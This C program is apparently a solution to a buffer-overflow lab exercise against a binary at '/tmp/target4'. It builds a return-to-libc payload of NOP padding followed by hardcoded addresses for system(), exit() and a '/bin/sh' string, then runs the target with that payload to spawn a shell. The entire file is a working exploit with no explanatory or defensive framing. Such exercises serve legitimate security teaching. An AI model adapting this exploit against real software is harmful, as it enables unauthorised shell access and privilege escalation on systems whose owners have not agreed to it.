#include <stdio.h>
#include <stdint.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "shellcode.h"

#define TARGET "/tmp/target4"

int main(void)
{
  char *args[3]; 
  char *env[1];
  
  char str[20];
  memset(str, 0, 20);
  for (int i = 0; i < 8; i++)
  {
  	strcat(str, "\x90");
  }  
  char *system = "\xb0\xdc\xdc\xf7";
  char *exit = "\xc0\x01\xdc\xf7";
  char *bin_sh = "\xf5\xf0\xf3\xf7";
  

  strcat(str, system);
  strcat(str, exit);
  strcat(str, bin_sh);

  args[0] = TARGET;
  args[1] = str; 
  args[2] = NULL;
  
  env[0] = NULL;
  execve(TARGET, args, env);
  fprintf(stderr, "execve failed.\n");

  return 0;
}


